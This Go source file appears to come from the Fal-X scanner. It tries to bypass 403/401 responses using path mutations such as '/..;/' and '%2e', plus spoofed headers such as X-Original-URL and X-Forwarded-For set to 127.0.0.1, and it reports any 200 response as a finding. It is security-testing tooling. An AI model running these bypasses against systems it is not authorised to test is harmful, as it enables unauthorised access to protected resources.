package native

import (
	"context"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/BhargavPalan/Fal-X/internal/graph"
	"github.com/BhargavPalan/Fal-X/internal/sources"
)

// Bypass403 tries to turn a forbidden URL into a readable one with the well-known
// access-control bypasses: path mutations a front proxy normalises differently from the
// backend, and request headers a backend trusts for the real client or the real path.
// It acts only on a URL that is actually 401/403, and a success (a 200 where the
// baseline was denied) is a confirmed finding, not a guess. It is active.
type Bypass403 struct {
	Client Doer
}

// NewBypass403 returns the prober with a client that does not follow redirects, so a
// 403 -> 30x -> 200 chain is not mistaken for a bypass.
func NewBypass403() *Bypass403 {
	return &Bypass403{Client: &http.Client{
		Timeout:       10 * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
	}}
}

// Capability marks it active, consuming a URL and producing findings.
func (b *Bypass403) Capability() sources.Capability {
	return sources.Capability{
		Name:     "native/bypass403",
		Consumes: []graph.EntityType{graph.TypeURL},
		Produces: []graph.EntityType{graph.TypeFinding},
		Passive:  false,
		Heavy:    true, // a dozen probes per forbidden URL
		Cost:     2,
	}
}

// Available is always true; it uses the standard library.
func (b *Bypass403) Available(sources.Env) bool { return true }

// Collect checks whether the URL is forbidden and, if so, tries each bypass.
func (b *Bypass403) Collect(ctx context.Context, in graph.Entity, sink sources.Sink) error {
	u, ok := parseWebURL(in.Key)
	if !ok || u.Path == "" || u.Path == "/" {
		return nil
	}
	if s := b.status(ctx, in.Key, nil); s != http.StatusForbidden && s != http.StatusUnauthorized {
		return nil // nothing to bypass
	}
	self := sink.Entity(graph.TypeURL, in.Key, in.Key)
	for _, t := range bypassTechniques(u) {
		if b.status(ctx, t.url, t.header) == http.StatusOK {
			sink.Fact(self, "finding", "high access-control-bypass "+t.name, 0.8)
			sink.Fact(self, "exposure", "access_control_bypass", 0.8)
			return nil
		}
	}
	return nil
}

// technique is one bypass attempt: a URL to request and optional headers to send.
type technique struct {
	name   string
	url    string
	header map[string]string
}

// bypassTechniques builds the path-mutation and header-override attempts for a URL.
func bypassTechniques(u *url.URL) []technique {
	origin := u.Scheme + "://" + u.Host
	p := u.Path
	q := ""
	if u.RawQuery != "" {
		q = "?" + u.RawQuery
	}
	withPath := func(name, path string) technique {
		return technique{name: name, url: origin + path + q}
	}
	withHeader := func(name, k, v string) technique {
		return technique{name: name, url: u.String(), header: map[string]string{k: v}}
	}
	return []technique{
		withPath("trailing-slash", p+"/"),
		withPath("trailing-dot", p+"/."),
		withPath("semicolon", p+"/..;/"),
		withPath("encoded-dot", "/%2e"+p),
		withPath("double-slash", "/"+p),
		withPath("uppercase", strings.ToUpper(p)),
		withHeader("x-original-url", "X-Original-URL", p),
		withHeader("x-rewrite-url", "X-Rewrite-URL", p),
		withHeader("x-forwarded-for", "X-Forwarded-For", "127.0.0.1"),
		withHeader("x-forwarded-host", "X-Forwarded-Host", "127.0.0.1"),
		withHeader("x-custom-ip-auth", "X-Custom-IP-Authorization", "127.0.0.1"),
		withHeader("x-originating-ip", "X-Originating-IP", "127.0.0.1"),
	}
}

// status requests a URL with optional headers and returns the status code, or 0.
func (b *Bypass403) status(ctx context.Context, rawURL string, hdr map[string]string) int {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return 0
	}
	req.Header.Set("User-Agent", "fal-x")
	for k, v := range hdr {
		req.Header.Set(k, v)
	}
	resp, err := b.Client.Do(req)
	if err != nil {
		return 0
	}
	defer resp.Body.Close()
	_ = readBounded(resp.Body, 2<<10)
	return resp.StatusCode
}
